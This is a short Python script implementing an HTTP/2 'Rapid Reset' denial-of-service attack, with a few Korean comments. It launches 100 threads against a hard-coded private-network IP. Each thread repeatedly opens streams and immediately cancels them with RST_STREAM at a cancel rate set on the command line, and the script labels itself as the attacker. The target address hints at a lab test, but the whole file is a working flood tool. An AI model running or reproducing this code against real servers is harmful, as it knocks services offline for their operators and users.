import socket, threading, time, sys, random
import h2.connection, h2.config

TARGET_IP = '192.168.20.10'
TARGET_PORT = 80
THREAD_COUNT = 100

# 인자값으로 취소율 조절 (기본값 1.0 = 100%)
CANCEL_RATE = float(sys.argv[1]) if len(sys.argv) > 1 else 1.0

def attack_worker(worker_id):
    while True:
        try:
            raw_socket = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=3)
            h2_conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
            h2_conn.initiate_connection()
            raw_socket.sendall(h2_conn.data_to_send())
            
            stream_id = 1
            while True:
                headers = [
                    (':method', 'GET'),
                    (':authority', TARGET_IP),
                    (':scheme', 'http'),
                    (':path', '/'),
                    ('user-agent', f'RapidReset-MegaBot-{worker_id}')
                ]
                h2_conn.send_headers(stream_id, headers)
                
                # 설정된 확률에 따라 취소 수행
                if random.random() < CANCEL_RATE:
                    h2_conn.reset_stream(stream_id, error_code=0x8)
                
                raw_socket.sendall(h2_conn.data_to_send())
                stream_id += 2
                time.sleep(0.001)
        except Exception:
            time.sleep(0.5)

print(f'🔥 [Attacker] {THREAD_COUNT} threads started. Cancel Rate: {CANCEL_RATE*100:.1f}%')
sys.stdout.flush()

for i in range(THREAD_COUNT):
    t = threading.Thread(target=attack_worker, args=(i,))
    t.daemon = True
    t.start()

while True:
    time.sleep(1)
